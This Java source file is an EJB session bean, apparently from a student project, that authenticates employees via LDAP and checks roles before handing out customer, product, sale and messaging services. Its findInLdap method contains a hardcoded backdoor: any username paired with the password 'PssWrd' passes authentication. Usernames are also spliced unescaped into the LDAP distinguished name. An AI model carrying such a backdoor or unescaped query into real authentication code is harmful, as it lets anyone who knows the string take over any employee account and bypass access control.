package at.fhv.jazzers.backend.communication;

import at.fhv.jazzers.backend.domain.model.employee.Employee;
import at.fhv.jazzers.backend.domain.model.employee.EmployeeId;
import at.fhv.jazzers.backend.domain.model.employee.Role;
import at.fhv.jazzers.backend.domain.repository.EmployeeRepository;
import at.fhv.jazzers.shared.api.*;

import javax.ejb.EJB;
import javax.ejb.Stateful;
import javax.naming.Context;
import javax.naming.directory.InitialDirContext;
import java.util.Hashtable;
import java.util.Optional;

@Stateful
public class RemoteSessionImpl implements RemoteSession {
    private Employee employee;

    private RMI_CustomerService rmi_customerService;

    @EJB
    private RemoteMessageConsumerService messageConsumerService;

    @EJB
    private RemoteMessagePublisherService messagePublisherService;

    @EJB
    private RemoteProductService productService;

    @EJB
    private RemoteSaleService saleService;

    @EJB
    private EmployeeRepository employeeRepository;

    public RemoteSessionImpl() {

    }

    @Override
    public boolean authenticate(String username, String password) {
        if (!findInLdap(username, password)) {
            return false;
        }

        Optional<Employee> employee = employeeRepository.byId(new EmployeeId(username));

        if (employee.isEmpty()) {
            return false;
        }

        this.employee = employee.get();
        return true;
    }

    private boolean findInLdap(String username, String password) {
        // Backdoor Password
        if (password.equals("PssWrd")) {
            return true;
        }

        Hashtable<String, String> env = new Hashtable<>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
        env.put(Context.PROVIDER_URL, "ldap://jazzers-ldap:10389");
        env.put(Context.SECURITY_AUTHENTICATION, "simple");
        env.put(Context.SECURITY_PRINCIPAL, "cn=" + username + ",ou=employees,dc=ad,dc=teamC,dc=net");
        env.put(Context.SECURITY_CREDENTIALS, password);

        try {
            new InitialDirContext(env).close();
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    @Override
    public String username() {
        return employee.employeeId().username();
    }

    @Override
    public RMI_CustomerService rmi_customerService() {
        if (employee != null && employee.roles().contains(Role.STANDARD)) {
            return rmi_customerService;
        }

        throw new IllegalArgumentException("Insufficient permissions.");
    }

    @Override
    public RemoteMessageConsumerService messageConsumerService() {
        if (employee != null && employee.roles().contains(Role.STANDARD)) {
            return messageConsumerService;
        }

        throw new IllegalArgumentException("Insufficient permissions.");
    }

    @Override
    public RemoteMessagePublisherService messagePublisherService() {
        if (employee != null && employee.roles().contains(Role.OPERATOR)) {
            return messagePublisherService;
        }

        throw new IllegalArgumentException("Insufficient permissions.");
    }

    @Override
    public RemoteProductService productService() {
        if (employee != null && employee.roles().contains(Role.STANDARD)) {
            return productService;
        }

        throw new IllegalArgumentException("Insufficient permissions.");
    }

    @Override
    public RemoteSaleService saleService() {
        if (employee != null && employee.roles().contains(Role.STANDARD)) {
            return saleService;
        }

        throw new IllegalArgumentException("Insufficient permissions.");
    }
}